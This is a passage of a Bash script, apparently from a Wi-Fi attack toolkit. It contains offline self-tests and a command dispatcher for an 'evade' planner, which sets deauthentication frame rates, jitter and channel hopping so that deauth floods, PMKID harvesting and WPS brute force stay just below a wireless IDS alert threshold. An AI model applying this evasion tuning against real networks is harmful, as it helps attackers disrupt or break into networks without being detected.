# used below lives in $TMP_DIR, never in the real IDS loot dir.
ids_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    vfld() { awk -F'\t' -v k="$1" '$1==k {print $2; exit}'; }

    local MOD_TMP="$TMP_DIR/wifi_ids_selftest"
    mkdir -p "$MOD_TMP"
    # Redirect the evade conf out of the real loot tree.
    local saved_conf="$IDS_EVADE_CONF"
    IDS_EVADE_CONF="$MOD_TMP/evade.conf"
    rm -f "$IDS_EVADE_CONF"

    # ── the detector constants the plan must respect ──
    chk deauth-threshold "$IDS_DEAUTH_THRESHOLD" "20"
    chk disassoc-threshold "$IDS_DISASSOC_THRESHOLD" "20"

    # ── plan with no conf file: defaults + derived safe ceiling ──
    local pl
    pl=$(ids_evade_plan slow 60)
    chk plan-rc "$?" "0"
    chk plan-safe-ceiling "$(vfld safe_per_10s <<<"$pl")" "19"
    chk plan-safe-is-threshold-minus-1 "$(vfld safe_per_10s <<<"$pl")" \
        "$(( IDS_DEAUTH_THRESHOLD - 1 ))"
    chk plan-threshold-echo "$(vfld deauth_threshold <<<"$pl")" "$IDS_DEAUTH_THRESHOLD"
    chk plan-rows "$(grep -c . <<<"$pl")" "11"
    chk plan-default-jitter "$(vfld jitter_ms <<<"$pl")" "250"
    chk plan-default-hop "$(vfld hop_interval <<<"$pl")" "5"
    chk plan-default-fragment "$(vfld fragment <<<"$pl")" "1"
    chk plan-default-dwell "$(vfld dwell_ms <<<"$pl")" "200"
    chk plan-evades "$(vfld evades <<<"$pl")" \
        "deauth flood,disassoc flood,beacon flood,PMKID harvest,WPS brute force"

    # ── per-profile rates (fraction of the detector's own ceiling) ──
    chk rate-slow "$(vfld rate_per_s <<<"$pl")" "0.47"
    chk total-slow "$(vfld total_frames <<<"$pl")" "28"
    local pstd pburst
    pstd=$(ids_evade_plan standard 60)
    pburst=$(ids_evade_plan burst 60)
    chk rate-standard "$(vfld rate_per_s <<<"$pstd")" "1.71"
    chk total-standard "$(vfld total_frames <<<"$pstd")" "102"
    chk rate-burst "$(vfld rate_per_s <<<"$pburst")" "1.42"
    chk total-burst "$(vfld total_frames <<<"$pburst")" "85"

    # The actual safety property, computed from the plan's own output:
    # ten seconds at the planned rate must never reach the alert threshold.
    local p under
    for p in "$pl" "$pstd" "$pburst"; do
        under=$(awk -F'\t' '$1=="rate_per_s"{r=$2} $1=="deauth_threshold"{t=$2}
                            END{printf "%s", (r*10 < t) ? "under" : "reaches"}' <<<"$p")
        chk "plan-under-threshold-$(vfld profile <<<"$p")" "$under" "under"
    done

    # An unknown profile falls back to the standard fraction rather than
    # failing or, worse, planning something faster than the threshold.
    local punk
    punk=$(ids_evade_plan nope 60)
    chk rate-unknown-profile "$(vfld rate_per_s <<<"$punk")" "1.71"

    # ── conf round trip ──
    ids_evade_save profile=slow jitter_ms=99 >/dev/null 2>&1
    local prt
    prt=$(ids_evade_plan)
    chk conf-profile-read "$(vfld profile <<<"$prt")" "slow"
    chk conf-jitter-read "$(vfld jitter_ms <<<"$prt")" "99"
    chk conf-hop-default "$(vfld hop_interval <<<"$prt")" "5"

    # Re-saving a key must replace it, not append a duplicate.
    ids_evade_save profile=burst >/dev/null 2>&1
    chk conf-no-duplicate-profile "$(grep -c '^profile=' "$IDS_EVADE_CONF")" "1"
    chk conf-profile-updated "$(ids_evade_opt profile)" "burst"
    chk conf-jitter-survives "$(ids_evade_opt jitter_ms)" "99"
    chk conf-default-when-absent "$(ids_evade_opt bogus_key fallback)" "fallback"

    # Unknown keys must be refused, and must not have been written.
    local rc=0
    ids_evade_save bogus=1 >/dev/null 2>&1 || rc=$?
    chk conf-unknown-key-rejected "$rc" "2"
    chk conf-unknown-key-not-written "$(grep -c '^bogus=' "$IDS_EVADE_CONF")" "0"

    chk evade-tsv-rows "$(ids_evade_tsv | grep -c .)" "11"

    # ── vendor parsers ──
    chk oui-intel "$(ids_vendor_from_oui 00:1A:7D:11:22:33)" "Intel"
    chk oui-asus "$(ids_vendor_from_oui AC:22:0B:AA:BB:CC)" "Asus"
    chk oui-netgear "$(ids_vendor_from_oui 20:E5:2A:00:00:01)" "Netgear"
    chk oui-apple "$(ids_vendor_from_oui 3C:07:54:00:11:22)" "Apple"
    chk oui-vmware "$(ids_vendor_from_oui 00:0C:29:12:34:56)" "VMware"
    chk oui-mikrotik "$(ids_vendor_from_oui 00:0C:42:00:00:01)" "MikroTik"
    chk oui-unknown "$(ids_vendor_from_oui DE:AD:BE:EF:00:01)" "unknown"
    chk ssid-netgear "$(ids_ssid_vendor 'NETGEAR42')" "Netgear"
    chk ssid-tplink "$(ids_ssid_vendor 'TP-LINK_5G')" "TP-Link"
    chk ssid-fritz "$(ids_ssid_vendor 'FRITZ!Box 7590')" "AVM"
    chk ssid-unknown "$(ids_ssid_vendor 'linksys')" "unknown"

    # ── dependency check with no PATH finds every tool, by name ──
    local sp="$PATH" depout
    PATH=/nonexistent-wifisting-selftest
    depout=$(ids_check_deps 2>&1); rc=$?
    PATH="$sp"
    chk dep-check-rc "$rc" "1"
    chk dep-check-names "$depout" "[-] missing: tshark tcpdump iw airodump-ng"

    chk unknown-command-rc "$(ids_cli_main --no-such-flag >/dev/null 2>&1; echo $?)" "2"

    rm -rf "$MOD_TMP"
    IDS_EVADE_CONF="$saved_conf"

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

ids_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --monitor-start)      ids_cli_monitor_start ;;
        --monitor-stop)       ids_cli_monitor_stop ;;
        --monitor-status)     ids_cli_monitor_status ;;
        --monitor-run)        ids_cli_monitor_run ;;
        --status-tsv)         ids_cli_status_tsv ;;
        --list-alerts-tsv)    ids_cli_list_alerts_tsv ;;
        --list-alerts-json)   ids_cli_list_alerts_json ;;
        --clear-alerts)       ids_cli_clear_alerts ;;
        --build-baseline)     ids_cli_build_baseline "$@" ;;
        --evade-tsv)          ids_evade_tsv ;;
        --evade-save)         ids_evade_save "$@" ;;
        --evade-plan)         ids_evade_plan "$@" ;;
        --evade-run)          ids_evade_run "$@" ;;
        --selftest)           ids_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --monitor-start | --monitor-stop | --monitor-status
  --list-alerts-tsv
  --list-alerts-json
  --clear-alerts
  --evade-tsv | --evade-plan [PROFILE] [DURATION]
  --evade-save KEY=VALUE ...  (profile, jitter_ms, hop_interval,
                               fragment, burst, dwell_ms)
  --evade-run PROFILE DURATION BSSID
  --build-baseline [DURATION]
  --selftest                  offline assertions, no hardware
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    : "${TMP_DIR:=/tmp/wifisting}"
    : "${LOOT_DIR:=$HOME/wifisting/loot}"
    : "${LOGS_DIR:=$HOME/wifisting/logs}"
    : "${WIFISTING_HOME:=$HOME/wifisting}"
    : "${WIFISTING_ROOT:=$HOME/wifisting}"
    : "${STATE_DIR:=$HOME/wifisting/state}"
    : "${LOG_DIR:=$HOME/wifisting/logs}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR" "$STATE_DIR"
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    ids_cli_main "$@"
fi
